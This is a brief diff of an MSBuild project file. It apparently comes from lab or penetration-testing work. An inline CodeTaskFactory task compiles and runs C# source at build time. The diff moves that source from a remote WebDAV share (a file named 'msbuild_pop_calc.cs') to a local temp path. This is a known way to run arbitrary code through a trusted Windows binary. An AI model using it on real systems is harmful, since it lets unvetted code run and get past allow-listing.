@@ -7,7 +7,7 @@
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
 	<Task>
-      <Code Type="Class" Language="cs" Source="\\192.168.49.84\webdav\msbuild_pop_calc.cs">
+      <Code Type="Class" Language="cs" Source="C:\Windows\Temp\msbuild.cs">
       </Code>
     </Task>
   </UsingTask>
